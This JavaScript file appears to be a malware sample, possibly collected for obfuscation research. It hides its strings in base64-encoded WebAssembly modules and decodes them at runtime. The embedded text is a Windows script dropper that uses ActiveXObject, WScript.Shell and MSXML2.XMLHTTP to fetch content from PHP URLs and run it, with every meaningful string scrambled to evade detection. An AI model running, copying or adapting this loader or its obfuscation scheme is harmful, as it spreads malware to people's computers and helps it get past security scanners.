const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGtoCAgAAJfwBBAQt/AEHOAwt/AEGmBwt/AEGQCwt/AEGqDwt/AEGcEwt/AEHiFgt/AEHkFgt/AEHmFgsH0oCAgAAKBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIC5mXgIAACQBBAQvLA2ZoenVleW5hc2N2eHR5cml6Y29uZm52cCUyMHNlZGNhbHp5KGFsZmlocmhsJTJDZnElMjBkZWZvdG5nZCUyQ3hhJTIweG5yZWhudXgpd3clN0JkaSUyMHhxJTIwcWt2dXlhb2dybnAlMjBvbHdtenN3YiUyMHN4JTNEZ3MlMjByc254bmVoZ3duYiUyMGN4QWlrY3ptdGJlaW1pdnlrZW9oWHJ1T3FyYm1panRrZWNyY2h0dHN4KGhxJTIyY3BXZWlTa3djeXJyamhpYmJwZnp0bWkuc25TcnVoenplcWhsdnpsdWYlMjJscSllaiUzQm5uJTIwZWMlMjBpc3Z1Z2FudXJuZiUyMGp4Zmh0bnBwJTIwcGclM0RqYSUyMGtvd2xzc2VhLmJ0RXhteHd1cGFnYWR4bm1mZHByRXZzbmtmdnpvaWpjcmtjb3FrbmJmbXl1ZWxmbm5ndG55U2JtdHR1cnZuaWNvbm55Z2Fvc2l4KG5zJTIyenklMjViaVR0ZUVwZk1oZlBvdSUyNXdkJTIyYXYpZG4lMjBpcyUyQmptJTIwb2dTaHB0Y3ZyY3lpeWdubmVncHgudGlmenFybmJvcHNtYmpDamJoAABBzgML1wNjeWF2enJ2dUN3aW96cGRhbGV0ayhnZjl4dTJheClxdyUyMGdrJTJCcWclMjBtYWZlem5wciUzQnhzJTIwZXElMjBkbnZjdWFuenJ3bCUyMGhmeGxtb2V0JTIwaGclM0RqdCUyMGtubnF2ZWZzd2R6JTIwc3JBcXhja3J0aXBpZXF2eXRlb3ZYcmpPbWViaGNqbHllemJja2J0bXQod3UlMjJ6ak1zYVNmbFhtY01qYkxkdjJndy5kcFh6eU1rZkxpdkhtYlRtc1RpeVBmYyUyMmpnKXJjJTNCcHQlMjBxaiUyMG13eGl4b3prLmtrb29zbmR3cmZxZWZ5YWtuZHdzeWNmc3Z1dHRiYWhmdGl3ZXpxY2lhaGRkYXJqbmxoZ3dmZWVlJTIweGwlM0R6bCUyMGZqZmNkdXR3bmh3Y3pndHRzaXlqb2VobmJvJTIwdnMoZ3Mpam4lN0JjYyUyMGJ3JTIwbHElMjBwaCUyMHdwaWd4Zmd3JTIwcmgoZHV4Y3BvbGYuZ2pycW1lanJhc2tkZWV5ZGpTdnh0d2VhZG50a2VlZ2IlMjByaCUzRHhkJTNEZHQlM0RpdiUyMHVsNGZ0KWR0JTdCdmElMjBibSUyMHZlJTIwYwAAQaYHC+kDeiUyMG1qJTIwZWMlMjBuZHZ2ZWFjcHJ5YSUyMHppeGFiYWtsJTIwYmIlM0RhbyUyMG1rbmR0ZWd5d2pvJTIweHpBYWVjamt0dWNpY252d21lY2VYenhPdXRiamxqZWJldHNjc2x0aXYoanUlMjJ1aUFwakRsaU9rYkR4bEJnZy5tdFNjc3R2d3JrdmVmdmFka21pZyUyMnV3KWpoJTNCaXolMjBjbSUyMGVjJTIwc3glMjBqZCUyMHllJTIwaGl4emthenAub2VveGdweW9lYWVudWUodXEpaWQlM0JkbyUyMGh6JTIwcWclMjB3diUyMGRvJTIwdmglMjBmdXhqbGF1dy5ld3RoYnlucnB0aGVjbSUyMHF1JTNEZGklMjB3bjFpdyUzQnl0JTIweGQlMjB2aSUyMHB0JTIwenElMjBwdiUyMGtueHJ5YW9nLnpld2p0cmhkaWppdHV5ZWx2KGdkeGRxb3V2LmpuUmZxZXJ3c3NwcHlub2FrbnJ2c2liZXdxQmplb3lnZGp4eXhvKWF0JTNCZnclMjBwdyUyMHZiJTIwdHclMjBmbSUyMHN0JTIwaXh4Z2ZhcnQub2hwZndvaXBza25pdWZ0Z3Fpc3RvZG5uZ2klMjBkeiUzRGRsJTIwcGwwcGgAAEGQCwuZBCUzQnByJTIwamslMjBvYyUyMHF4JTIwbW0lMjBlayUyMHVleGR5YWxjLmdkc3puYXRkdmhoZWtsVHh1b2plRnR2aWp6bGl1ZXB4KHBsZndvbnpmJTJDaGElMjBueDJyeClydyUzQmVoJTIwanolMjBudSUyMGJuJTIwem0lMjB1aiUyMGZ5eHl2YWxoLnB2Y2xjbGNxb2ptc21kZXpiKGZxKWx3JTNCaGElMjBvbiUyMGNwJTIwbWQlMjByZyU3RHlnJTIwbWglMjBlYSUyMGxvJTIweGElM0JiayUyMGhpJTIwaXMlN0RkbyUyMHJ0JTIwcHUlM0JjbCUyMGxxJTIwYWJ0d2RybG55b3klMjB3YyU3QnRkJTIwZXIlMjBmaSUyMHlvJTIwY294YnJvZWwuemdvcWNwdGdlZmNudXgoY28lMjJjZUdhYUVjaFRncSUyMnVlJTJDa3olMjBxY2Z1ZHJxeiUyQ2NzJTIwZWRmb3VhaWtsdnlzbWRlZmkpcWUlM0JrbSUyMGd3JTIwb24lMjBoYSUyMG1heGdhb2pjLmNzc3hpZWdrbml2ZHR6KGplKWF0JTNCZm0lMjBhbyUyMHFoJTIwZ3UlMjB1dGlyZ2ZsbCUyMHNoKHVscmt1bm9qJTIwZmElM0V6aCUyMGJ4MHR1KWtzJTdCY3olMjBoaSUyMHRtJTIwZGMlMjB4aiUyMHh3JTIwAABBqg8L8QNoZndjenNjZC5xZ1JkdHVhYW5uYyhmZWZhdG5zYiUyQ3Z4JTIwbG0wc2IlMkN3dSUyMHdqMGF3KXprJTNCaHolMjBoZyUyMHNiJTIwbm0lMjBzayU3RHhnJTIwaHclMjBkZCUyMHd1JTIwbWUlM0JseiUyMG9hJTIwbnclN0RzdCUyMGFmJTIwb3lja2thanN0cmhjdnFoaGUlMjBmdihmeGVld3J4dyl6diU3Qmp4JTIwaWklMjBhaCU3RGttJTIwd3klMjBhdyUzQmplJTdEaG9kbndsYWQoc2glMjJqdGhhaXRieXR2anBpdyUzQWRlJTJGeGIlMkZrZGJhcGlwYmdpZGJmamFjdGdmdnRiYXJidWVqYnZyZGV2bHJwZi5wZ2N1dW9rY21yaSUyRm1jaWdvbW52Z3l3JTJGdWpzdWRjemhyZ3JpaHRwZ2l0bWguaGtwc2FoaHZwdG8lM0Z1d2l2emJza2RwdzFvdS5qaWpnd3B0eWdpeCUyMmJ1JTJDcnclMjB6biUyMnZhMXNlMnNmN3prNHV2OWFmMGNxNW9oLmFiZXVxeHB5ZWx5JTIyZ28lMkNzZiUyMHp1MWpkKWZ6JTNCcHNkenpsY3AocmQlMjJkdmhpZ3RrYnRqdHBjaiUzQXZqJTJGemklMkZiAABBnBMLxQNvYmdhaWRjZ3FjYm5pYWlwZ2RkdGNlcmx2ZWN2dmxnZWNncnB1LmhsY3hmb2tjbXV5JTJGcmZpZnRtdWxncmIlMkZ5eHNkcWN5Y3JieGl5ZnBscHRydS5zZXBqeGh3a3BzZiUzRmlyaXl1YmR2ZHVlMnNkLmxvamFvcHJsZ3BpJTIycnklMkNoaiUyMGRzJTIycno0aHQycmE3d3MzdXYyY3MweWc1cmgucXFldm94dnZlaGQlMjJ5ZCUyQ2diJTIwYm0xbHopbmQlM0JjemRreWx4cShjaSUyMmRhaHFhdGx1dGttcGN6JTNBbGwlMkZ0ZiUyRmZpYnNvaXJ5Z3FxYmdyYXVvZ3podHZ3cmhmZWFzdmVmZWNxcmJyLmZ0Y3ptb2RxbWp4JTJGYmxpZHZtc3Nnd28lMkZpbnNsemNxbnJqbGl2dHBwdHRwdy5waHBmeGhqd3BqbSUzRmp2aWhyYm5iZHJjM2l3LnV3anVicGhuZ2liJTIybWUlMkN4ciUyMHpsJTIyYWcyY2szcXE1bXI0Z2Q4amg2dHI5bngucm5lY294em5ld3glMjJkYiUyQ3p6JTIwY3oxZ2wpaXAlM0J2aQAAQeIWCwEAAEHkFgsBAABB5hYLAQA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var iglvzh = lS(0, 0);
var xwbfo = lS(0, 1);
var hhjbr = lS(0, 2);
var rvek = lS(0, 3);
var iuk = lS(0, 4);
var vplh = lS(0, 5);
var cuvezwyo = iglvzh + xwbfo + hhjbr + rvek + iuk + vplh;
var dtfrocdh = lS(0, 6);
var ouayjcmtl = 3;
var culemssjru = cuvezwyo.split(lS(0, 7));
var ryszwlsd = lS(0, 8);
(() => {
    i = 0;
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return i < culemssjru.length ? 1 : 0;
            },
            update: () => {
                i += ouayjcmtl;
            },
            body: () => {
                {
                    dtfrocdh = dtfrocdh + culemssjru[i];
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
(() => {
    const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                print(dtfrocdh);
            }
        }
    });
    const __exports = __callInstance1.exports;
    return __exports.data();
})();
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                print(ryszwlsd);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();